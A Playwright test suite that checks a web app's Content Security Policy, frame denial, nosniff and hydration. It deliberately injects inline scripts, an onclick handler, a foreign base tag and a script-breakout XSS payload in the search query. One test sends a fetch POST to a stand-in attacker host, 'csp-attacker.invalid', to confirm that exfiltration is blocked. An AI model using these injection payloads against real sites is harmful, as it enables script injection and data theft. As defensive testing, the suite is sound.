import { expect } from "@playwright/test";
import { test } from "./support/csp-fixture.ts";
import { publishWork } from "./support/works.ts";
import { registerThroughForm, uniqueEmail } from "./support/accounts.ts";

// Header strings alone cannot establish that a browser actually refuses script
// execution. These probes deliberately create violations with exact allowances;
// the rest of the suite must have none, including its secondary/closed contexts.
test("cached renderer provenance cannot execute a different inline script", async ({ page, cspAudit }) => {
  const response = await page.goto("/");
  expect(response?.status()).toBe(200);
  expect(response?.headers()["cache-control"]).toContain("s-maxage=60");
  const policy = response?.headers()["content-security-policy"] ?? "";
  expect(policy).toContain("'sha256-");
  expect(policy).not.toContain("'nonce-");
  // Read the nonce property, not getAttribute: Chromium hides CSP nonce
  // attributes. A shared cache or a response reader can know this marker.
  const marker = await page.locator("script[nonce]").first().evaluate(element => (element as HTMLScriptElement).nonce);
  expect(marker).toMatch(/^[A-Za-z0-9_-]{32}$/);
  cspAudit.expectBlocked("script-src-elem", "inline", 2);
  await page.evaluate((knownMarker) => {
    const unmarked = document.createElement("script");
    unmarked.textContent = "window.__cspUnexpectedExecution = 'unmarked'";
    document.body.append(unmarked);
    const copied = document.createElement("script");
    copied.nonce = knownMarker;
    copied.textContent = "window.__cspUnexpectedExecution = 'copied-marker'";
    document.body.append(copied);
  }, marker);
  await expect.poll(() => cspAudit.violations.length).toBe(2);
  expect(await page.evaluate(() => "__cspUnexpectedExecution" in window)).toBe(false);
  // The trusted module still hydrates and handles a real client interaction.
  await page.goto("/sign-in");
  await page.getByRole("button", { name: "没有账户？创建账户", exact: true }).click();
  await expect(page.getByRole("button", { name: "创建账户并继续" })).toBeVisible();
});

test("inline event handlers are blocked even when style attributes remain available to GSAP", async ({ page, cspAudit }) => {
  await page.goto("/sign-in");
  cspAudit.expectBlocked("script-src-attr", "inline");
  await page.evaluate(() => {
    const button = document.createElement("button");
    button.textContent = "CSP event-handler attack";
    button.setAttribute("onclick", "window.__cspUnexpectedExecution = 'handler'");
    button.style.transform = "translateX(3px)";
    button.dataset.cspAttack = "handler";
    document.body.append(button);
    button.click();
  });
  await expect.poll(() => cspAudit.violations.length).toBe(1);
  expect(await page.evaluate(() => "__cspUnexpectedExecution" in window)).toBe(false);
  await expect(page.locator('[data-csp-attack="handler"]')).toHaveCSS("transform", "matrix(1, 0, 0, 1, 3, 0)");
});

test("the automatic audit retains a violation after a secondary context and its tab close", async ({ browser, baseURL, cspAudit }) => {
  const secondary = await browser.newContext({ baseURL });
  try {
    const page = await secondary.newPage();
    await page.goto("/");
    cspAudit.expectBlocked("script-src-elem", "inline");
    await page.evaluate(() => {
      const attack = document.createElement("script");
      attack.textContent = "window.__cspUnexpectedExecution = 'secondary-tab'";
      document.body.append(attack);
    });
    await expect.poll(() => cspAudit.violations.length).toBe(1);
    expect(await page.evaluate(() => "__cspUnexpectedExecution" in window)).toBe(false);
  } finally { await secondary.close(); }
  expect(cspAudit.violations).toHaveLength(1);
  expect(cspAudit.violations[0]?.document).toBe(`${baseURL}/`);
});

test("HTML script hashes survive browser back/forward and client-side route discovery", async ({ page }) => {
  await page.goto("/sign-in");
  await page.getByRole("button", { name: "没有账户？创建账户", exact: true }).click();
  await expect(page.getByRole("heading", { name: "创建账户 Join" })).toBeVisible();
  await page.goto("/authors");
  await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
  await page.goBack();
  await expect(page.getByLabel("邮箱")).toBeVisible();
  await page.getByRole("button", { name: /没有账户？创建账户|已有账户？登录/ }).click();
  await expect(page.getByLabel("密码")).toBeVisible();
  await page.goForward();
  await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
});

test("base and object restrictions block active document capabilities, not only script tags", async ({ page, baseURL, cspAudit }) => {
  await page.goto("/sign-in");
  const foreignBase = "https://csp-attacker.invalid/";
  const objectTarget = `${baseURL}/favicon.svg`;
  cspAudit.expectBlocked("base-uri", foreignBase);
  cspAudit.expectBlocked("object-src", objectTarget);
  const originalBase = await page.evaluate(() => document.baseURI);
  const effectiveBase = await page.evaluate(({ foreignBase, objectTarget }) => {
    const base = document.createElement("base");
    base.href = foreignBase;
    document.head.append(base);
    const effectiveBase = document.baseURI;
    // Keep one deliberate attempt, not a persistent rejected base that later
    // React head-link changes can make the browser evaluate a second time.
    base.remove();
    const object = document.createElement("object");
    object.data = objectTarget;
    object.type = "image/svg+xml";
    document.body.append(object);
    return effectiveBase;
  }, { foreignBase, objectTarget });
  expect(effectiveBase).toBe(originalBase);
  await expect.poll(() => cspAudit.violations.length).toBe(2);
  expect(await page.evaluate(() => document.baseURI)).toBe(originalBase);
  await expect(page.getByLabel("邮箱")).toBeVisible();
});

test("cross-origin data exfiltration is blocked before a browser network request is sent", async ({ page, cspAudit }) => {
  await page.goto("/sign-in");
  const target = "https://csp-attacker.invalid/";
  const requests: string[] = [];
  await page.route("https://csp-attacker.invalid/**", async route => {
    requests.push(route.request().url());
    await route.abort();
  });
  cspAudit.expectBlocked("connect-src", target);
  const blocked = await page.evaluate(async (url) => {
    try { await fetch(url, { method: "POST", body: "fixture-public-text" }); return false; }
    catch { return true; }
  }, target);
  expect(blocked).toBe(true);
  await expect.poll(() => cspAudit.violations.length).toBe(1);
  expect(requests).toEqual([]);
  // Same-origin BFF connections remain available under the same policy.
  const status = await page.evaluate(async () => (await fetch("/api/authoring/session")).status);
  expect(status).toBe(401);
});

test("a separate embedding document cannot frame the real sign-in page", async ({ browser, baseURL }) => {
  const context = await browser.newContext();
  try {
    const parent = await context.newPage();
    const errors: string[] = [];
    parent.on("console", message => { if (message.type() === "error") errors.push(message.text()); });
    const attempted = parent.waitForResponse(response => response.url() === `${baseURL}/sign-in`);
    // An opaque-origin attacker document has no parent frame-src restriction,
    // so only the protected CHILD's actual response can deny this navigation.
    await parent.setContent(`<h1>Controlled embedding probe</h1><iframe src="${baseURL}/sign-in" title="Protected child"></iframe>`);
    const response = await attempted;
    expect(response.status()).toBe(200);
    expect(response.headers()["x-frame-options"]).toBe("DENY");
    expect(response.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
    await expect.poll(() => parent.frames().filter(frame => frame !== parent.mainFrame()).map(frame => frame.url()))
      .toContain("chrome-error://chromewebdata/");
    await expect.poll(() => errors.some(error => /frame-ancestors|X-Frame-Options/.test(error))).toBe(true);
    await expect(parent.getByRole("heading", { name: "Controlled embedding probe" })).toBeVisible();
    expect(await parent.locator("iframe").evaluate(element => (element as HTMLIFrameElement).contentDocument)).toBeNull();
  } finally { await context.close(); }
});

test("same-origin JSON is refused as a script by nosniff rather than relying on a syntax error", async ({ page }) => {
  await page.goto("/sign-in");
  const mimeErrors: string[] = [];
  page.on("console", message => { if (message.type() === "error") mimeErrors.push(message.text()); });
  const requested = page.waitForResponse(response => new URL(response.url()).pathname === "/healthz");
  const loaded = await page.evaluate(() => new Promise<boolean>(resolve => {
    const script = document.createElement("script");
    script.src = "/healthz";
    script.onload = () => resolve(true);
    script.onerror = () => resolve(false);
    document.body.append(script);
  }));
  expect(loaded).toBe(false);
  const response = await requested;
  expect(response.status()).toBe(200);
  expect(response.headers()["x-content-type-options"]).toBe("nosniff");
  expect(response.headers()["content-type"]).toContain("application/json");
  await expect.poll(() => mimeErrors.some(error => /MIME type.*application\/json.*(executable|strict MIME)/i.test(error))).toBe(true);
  await page.getByRole("button", { name: "没有账户？创建账户", exact: true }).click();
  await expect(page.getByRole("button", { name: "创建账户并继续" })).toBeVisible();
});

test("a sealed article hydrates in place without replacing the focused SSR main or nesting dialog forms", async ({ page, request }) => {
  const { slug } = await publishWork(request, `安全策略下的原位 hydration ${Date.now().toString(36)}`, ["在脚本加载前使用键盘，焦点不能被 hydration 丢弃。"]);
  const errors: string[] = [];
  page.on("pageerror", error => errors.push(error.message));
  let release!: () => void;
  const hydration = new Promise<void>(resolve => { release = resolve; });
  await page.route(/\/assets\/entry\.client-[^/]+\.js$/, async route => { await hydration; await route.continue(); });
  try {
    await page.goto(`/articles/${slug}`, { waitUntil: "commit" });
    const main = page.locator("main");
    await expect(main).toBeVisible();
    const original = await main.elementHandle();
    expect(original).not.toBeNull();
    const form = page.locator("form.nw-comment-form");
    expect(await form.evaluate(element => ({
      nestedDialogs: element.querySelectorAll("dialog").length,
      ownsSubmit: element.querySelector<HTMLButtonElement>('button[type="submit"]')?.form === element,
    }))).toEqual({ nestedDialogs: 0, ownsSubmit: true });
    await page.keyboard.press("Tab");
    await expect(page.getByRole("link", { name: "跳到正文", exact: true })).toBeFocused();
    await page.keyboard.press("Enter");
    await expect(main).toBeFocused();
    release();
    await expect(page.getByText("还没有评论，欢迎留下第一条回应。", { exact: true })).toBeVisible();
    expect(await original!.evaluate(element => element.isConnected)).toBe(true);
    await expect(main).toBeFocused();
    await page.getByRole("toolbar", { name: "评论格式" }).getByRole("button", { name: "链接", exact: true }).click();
    const dialog = page.getByRole("dialog", { name: "插入链接" });
    await expect(dialog).toBeVisible();
    expect(await dialog.evaluate(element => ({
      outerForm: element.closest("form") !== null,
      ownsSubmit: element.querySelector<HTMLButtonElement>('button[type="submit"]')?.form === element.querySelector("form"),
    }))).toEqual({ outerForm: false, ownsSubmit: true });
    await dialog.getByRole("button", { name: "取消", exact: true }).click();
    await expect(dialog).not.toBeVisible();
    expect(errors, "sealing CSP must not hide hydration failures behind a client re-render").toEqual([]);
  } finally { release(); }
});

test("one cached public document's CSP continues to protect real client-side public/private route transitions", async ({ page }) => {
  const email = uniqueEmail("csp-client-routes");
  await registerThroughForm(page, email, "/account");
  const documents: string[] = [];
  page.on("request", request => { if (request.isNavigationRequest() && request.resourceType() === "document") documents.push(request.url()); });
  const initial = await page.goto("/");
  expect(initial?.headers()["cache-control"]).toContain("s-maxage=60");
  const timeOrigin = await page.evaluate(() => performance.timeOrigin);
  // A real hydrated control, not a timer or a global framework-internal flag.
  await page.getByRole("button", { name: "通知", exact: true }).click();
  await expect(page.getByRole("dialog", { name: "通知", exact: true })).toBeVisible();
  await page.getByRole("dialog", { name: "通知", exact: true }).getByRole("button", { name: "关闭", exact: true }).click();
  const navigation = page.getByRole("navigation", { name: "主导航", exact: true });
  await navigation.getByRole("link", { name: "写作", exact: true }).click();
  await expect(page).toHaveURL(/\/write$/);
  await expect(page.getByRole("toolbar", { name: "富文本格式" })).toBeVisible();
  await expect(page.getByLabel("作品正文")).toBeEditable();
  expect(await page.evaluate(() => performance.timeOrigin)).toBe(timeOrigin);
  await navigation.getByRole("link", { name: "账户", exact: true }).click();
  await expect(page).toHaveURL(/\/account$/);
  await expect(page.getByRole("heading", { level: 1, name: "我的账户 Account", exact: true })).toBeVisible();
  await expect(page.locator("[data-account-email]")).toHaveText(email);
  await expect(page.getByRole("button", { name: "修改密码", exact: true })).toBeEnabled();
  expect(await page.evaluate(() => performance.timeOrigin)).toBe(timeOrigin);
  await page.getByRole("navigation", { name: "页尾导航", exact: true }).getByRole("link", { name: "作者", exact: true }).click();
  await expect(page).toHaveURL(/\/authors$/);
  await expect(page.getByRole("heading", { level: 1, name: /作者/ })).toBeVisible();
  expect(await page.evaluate(() => performance.timeOrigin)).toBe(timeOrigin);
  expect(documents).toHaveLength(1);
  expect(documents[0]).toBe(initial!.url());
});

test("untrusted search text stays inert through SSR serialization and hydration rather than gaining a renderer hash", async ({ page }) => {
  const executable = "window.__untrustedSearchExecution = true;";
  const payload = `</script><script>${executable}</script>`;
  const response = await page.goto(`/search?q=${encodeURIComponent(payload)}`);
  expect(response?.status()).toBe(200);
  expect(response?.headers()["cache-control"]).toContain("no-store");
  const policy = response?.headers()["content-security-policy"] ?? "";
  expect(policy).toContain("script-src 'self' 'sha256-");
  expect(policy).not.toContain("'unsafe-eval'");
  expect(await response!.text()).not.toContain(`<script>${executable}</script>`);
  await expect(page.getByRole("searchbox")).toHaveValue(payload);
  await expect(page.locator("main")).toContainText(payload);
  expect(await page.locator("script").evaluateAll((scripts, attack) => scripts.filter(script => script.textContent === attack).length, executable)).toBe(0);
  expect(await page.evaluate(() => "__untrustedSearchExecution" in window)).toBe(false);
  await page.getByRole("button", { name: "通知", exact: true }).click();
  const bell = page.getByRole("dialog", { name: "通知", exact: true });
  await expect(bell).toBeVisible();
  await bell.getByRole("button", { name: "关闭", exact: true }).click();
  await expect(page.getByRole("searchbox")).toHaveValue(payload);
  expect(await page.evaluate(() => "__untrustedSearchExecution" in window)).toBe(false);
  await page.getByRole("searchbox").fill("不会执行的普通检索");
  const next = page.waitForResponse(reply => reply.request().isNavigationRequest() && new URL(reply.url()).pathname === "/search");
  await page.getByRole("search").getByRole("button", { name: "搜索", exact: true }).click();
  expect((await next).status()).toBe(200);
  await expect(page.getByRole("searchbox")).toHaveValue("不会执行的普通检索");
  expect(await page.evaluate(() => "__untrustedSearchExecution" in window)).toBe(false);
});
